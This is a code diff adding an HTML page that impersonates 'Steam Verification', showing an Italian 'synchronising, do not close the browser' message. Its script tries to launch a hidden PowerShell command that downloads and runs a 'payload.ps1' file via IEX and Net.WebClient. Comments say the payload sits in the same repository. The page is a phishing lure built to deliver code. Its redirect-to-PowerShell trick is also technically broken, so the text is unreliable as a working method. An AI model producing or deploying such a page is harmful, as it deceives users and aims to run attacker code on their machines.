@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Steam Verification</title>
+</head>
+<body>
+    <h1>Sincronizzazione in corso... Non chiudere il browser.</h1>
+    <script>
+        // Questo script tenta di forzare l'esecuzione di un comando via PowerShell
+        // puntando al file che hai caricato nello stesso repository
+        window.location.href = "powershell -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('./payload.ps1')";
+    </script>
+</body>
+</html>
